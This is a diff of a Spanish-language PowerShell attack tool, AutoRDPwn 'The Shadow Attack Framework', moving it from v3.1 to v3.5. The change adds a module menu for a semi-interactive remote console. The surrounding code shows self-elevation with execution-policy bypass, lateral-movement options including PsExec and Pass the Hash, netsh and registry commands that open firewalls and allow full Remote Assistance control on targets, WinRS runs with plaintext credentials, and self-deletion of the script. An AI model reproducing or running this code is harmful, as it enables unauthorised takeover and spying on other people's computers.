@@ -1,6 +1,6 @@
 ﻿if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
 [Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")
-$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v3.1 - by @JoelGMSec"
+$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v3.5 - by @JoelGMSec"
 $Host.UI.RawUI.BackgroundColor = 'Black'
 $Host.UI.RawUI.ForegroundColor = 'Gray'
 $Host.PrivateData.ErrorForegroundColor = 'Red'
@@ -12,7 +12,7 @@ $Host.PrivateData.ProgressBackgroundColor = 'Blue'
 $ErrorActionPreference = "SilentlyContinue"
 Clear-Host
 
-function Show-Menu {
+function Show-Banner {
      Write-Host ""
      Write-Host "    _____         __       " -NoNewLine -ForegroundColor Magenta ; Write-Host "___________________________ " -NoNewLine -ForegroundColor Blue ; Write-Host "               " -ForegroundColor Green
      Write-Host "   /  _  \  __ __|  |_ ____" -NoNewLine -ForegroundColor Magenta ; Write-Host "\______   \______ \______  \" -NoNewLine -ForegroundColor Blue ; Write-Host "  _  ________ " -ForegroundColor Green
@@ -22,14 +22,16 @@ function Show-Menu {
      Write-Host "  \/                        " -NoNewLine -ForegroundColor Magenta ; Write-Host "       \/              " -NoNewLine -ForegroundColor Blue ; Write-Host "                \/ " -ForegroundColor Green
      Write-Host "" 
      Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
-     Write-Host "::" -NoNewLine -ForegroundColor Gray ; Write-Host "  The Shadow Attack Framework" -NoNewLine -ForegroundColor Yellow ; Write-Host "  :: " -NoNewLine -ForegroundColor Gray ; Write-Host "v3.1" -NoNewLine -ForegroundColor Yellow ; Write-Host " ::" -NoNewLine -ForegroundColor Gray ; Write-Host "  Created by @JoelGMSec" -NoNewLine -ForegroundColor Yellow ; Write-Host "  ::" -ForegroundColor Gray
+     Write-Host "::" -NoNewLine -ForegroundColor Gray ; Write-Host "  The Shadow Attack Framework" -NoNewLine -ForegroundColor Yellow ; Write-Host "  :: " -NoNewLine -ForegroundColor Gray ; Write-Host "v3.5" -NoNewLine -ForegroundColor Yellow ; Write-Host " ::" -NoNewLine -ForegroundColor Gray ; Write-Host "  Created by @JoelGMSec" -NoNewLine -ForegroundColor Yellow ; Write-Host "  ::" -ForegroundColor Gray
      Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
-     Write-Host ""   
+     Write-Host "" }
+function Show-Menu {  
      Write-Host "[1] - PsExec"
      Write-Host "[2] - Pass the Hash (Beta)"
      Write-Host "[3] - Windows Management Instrumentation"
      Write-Host "[4] - Schedule Task"
      Write-Host "[5] - Windows Remote Assistance"
+     Write-Host "[M] - Cargar módulos adicionales"
      Write-Host "[X] - Cerrar el programa"
      Write-Host "" }
 
@@ -60,7 +62,7 @@ $Ps3="netsh advfirewall firewall set rule group='Detección de redes' new enable
 $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule group='Administración remota de Windows' new enable=yes"
 
     do { 
-    Show-Menu
+    Show-Banner ; Show-Menu
     $input = Read-Host -Prompt "Elige cómo quieres lanzar el ataque"
     switch ($input) {
     
@@ -164,7 +166,13 @@ $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Ps2" 
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Ps3" 
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Ps4" }
-		
+	
+        'M' { 
+        Clear-Host; Show-Banner ; Write-Host "[1] - Consola semi-interactiva" ; Write-Host ""
+        $console = Read-Host -Prompt 'Elige el módulo que quieres cargar' ; Write-Host ""
+        if($console -like '1') { Write-Host "Módulo cargado con éxito!" -ForegroundColor Magenta
+        sleep -milliseconds 2000 ; Clear-Host }}
+	
         'X' { exit }
 
         default {
@@ -230,7 +238,7 @@ $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración
     REG ADD "HKLM\System\CurrentControlSet\Control\Remote Assistance" /v fAllowToGetHelp /t REG_DWORD /d 1 1> $null
     REG DELETE "HKLM\System\CurrentControlSet\Control\Remote Assistance" /v fAllowFullControl /f 1> $null
     REG ADD "HKLM\System\CurrentControlSet\Control\Remote Assistance" /v fAllowFullControl /t REG_DWORD /d 1 1> $null
-    Write-Host "Cambios en el registro de Windows realizados con éxito." -ForegroundColor Green ; Write-Host "" }
+    Write-Host "Cambios en el registro de Windows realizados con éxito" -ForegroundColor Green ; Write-Host "" }
     $hostname = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr "host" | select -First 1).split(':')[1].trim()}
     Write-Host "Detectando versión del sistema operativo en $hostname.." -ForegroundColor Magenta 
     $version = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr "Microsoft Windows" | select -First 1).split(':')[1].trim()}
@@ -302,7 +310,7 @@ Write-Host ""
 $session = get-pssession
 if ($session){ Write-Host "Iniciando conexión remota.." -ForegroundColor Blue ; sleep -milliseconds 3000 
 $PlainTextPassword = ConvertFrom-SecureToPlain $password
-Clear-Host ; Write-Host '>> Consola semi-interactiva en equipo remoto <<' ; Write-Host "" ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }
+if ($console){ Clear-Host ; Write-Host '>> Consola semi-interactiva en equipo remoto <<' ; Write-Host "" ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
 else { Write-Host "Algo salió mal, cerrando el programa.." -ForegroundColor Red ; sleep -milliseconds 3000 }
 $PScript = $MyInvocation.MyCommand.Definition
 Remove-Item $PScript
